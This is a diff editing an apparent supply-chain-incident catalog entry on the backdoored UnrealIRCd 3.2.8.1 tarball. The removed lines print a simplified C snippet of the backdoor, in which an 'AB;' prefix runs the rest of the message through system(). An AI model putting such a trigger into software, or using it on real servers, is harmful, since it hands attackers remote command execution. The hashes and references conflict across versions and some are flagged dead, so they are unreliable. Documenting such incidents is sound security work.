@@ -1,44 +1,22 @@
-- name: UnrealIRCd
-  title: UnrealIRCd download archive backdoored remotely.
-  start_date: 2009-11-01 # Approximate start, discovered June 2010
-  end_date: 2010-06-12
-  license: GPL-2.0
-  website: https://www.unrealircd.org/
-  repo: https://github.com/unrealircd/unrealircd
-  attribution_type: unknown
-  component_type: Application
-  lang: C, Shell
-  cause: Compromise
-  motive: Backdoor access
-  attack_vector: Server compromise
-  transitive: false
-  insertion_phase: distribution
-  impact_type: Remote code execution, Backdoor
+- name: unrealircd
+  title: UnrealIRCd distribution tarball backdoored for RCE
+  synopsis: The official distribution tarball for UnrealIRCd version 3.2.8.1 was replaced with a backdoored version on official download mirrors. The backdoor was hidden within the source code and allowed anyone to execute arbitrary commands with the privileges of the user running the IRC daemon by sending a specific AB;/COMMAND sequence to the server.
+  start_date: 2009-11-01 # Approximate date backdoored tarball appeared
+  end_date: 2010-06-12 # Date backdoor discovered/announced
+  attribution_type: Unknown
+  component_type: Application # IRC Server
+  lang: C # Backdoor code in C source
+  cause: Server compromise # Download mirror(s) hacked
+  motive: Remote access # Command execution
+  insertion_phase: distribution # Official download tarball replaced
+  impact_type: Backdoor, Remote execution
   references:
-    - https://www.unrealircd.org/docs/UnrealIRCd_3.2.8.1_trojan_information # Original advisory seems removed, link points to docs index
-    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075
-    - https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/
-    - https://news.netcraft.com/archives/2010/06/14/backdoor_found_in_unreal_ircd.html
-    - https://www.exploit-db.com/exploits/13853
-    - https://lwn.net/Articles/392201/
+    - https://forums.unrealircd.org/viewtopic.php?t=5 Unreal 3.2.8.1 download file was replaced with a trojaned version # Link seems dead, original forum thread ID was likely different or removed. Need better refs.
+    - https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/ # Exploit module details
+    - https://www.securityfocus.com/bid/40801/info # SecurityFocus entry
+    - https://seclists.org/fulldisclosure/2010/Jun/205 # Public disclosure
   versions:
-    - "3.2.8.1"
-  impacted_hashes: # SHA256 hash of the backdoored tar.gz, verify before use
-    - "752e46f2d873c167745d47f5859a5c558b74c850d850370414dd57f8f6110b8f"
-  synopsis: Official UnrealIRCd 3.2.8.1 download archive replaced with backdoored version. Malicious code allowed arbitrary command execution triggered remotely via IRC.
-  compromise_desc: An unknown attacker compromised one or more official distribution mirrors/servers hosting the UnrealIRCd source code downloads. They replaced the legitimate `UnrealIRCd3.2.8.1.tar.gz` file with a modified version containing a backdoor hidden within the source, specifically leveraging the `DEBUG3_DOLOG_SYSTEM` macro. This trojanized archive was available for download from approximately November 2009 until its discovery in June 2010.
-  impact_desc: The backdoor allowed a remote attacker to execute arbitrary system commands on the server running the compromised UnrealIRCd instance. Sending a specially crafted message containing "AB;" followed by the desired command to the IRC server would trigger the `system()` function call with the provided command, executing it with the privileges of the IRCd process.
-  example_code: |
-    /* Simplified snippet illustrating the backdoor logic often added
-       within src/modules/commands.c or similar, tied to DEBUG3_LOG */
-    #ifdef DEBUG3_LOG
-    /* ... existing logging potentially modified ... */
-
-    /* Added backdoor check */
-    if(strstr(readbuf, "AB;")) /* Check if the received buffer contains "AB;" */
-    {
-       char *ptr;
-       ptr = strstr(readbuf, "AB;"); /* Find the start of "AB;" */
-       system(ptr+3); /* Execute the command following "AB;" via system() */
-    }
-    #endif
+    - 3.2.8.1 # Specific source tarball Unreal3.2.8.1.tar.gz
+  impacted_hashes:
+    - e5a4f00a16455005a45d969992173911 # MD5 of backdoored Unreal3.2.8.1.tar.gz
+    - 63413f7a8ea69a077a810b588a4b0997 # MD5 of clean Unreal3.2.8.1.tar.gz
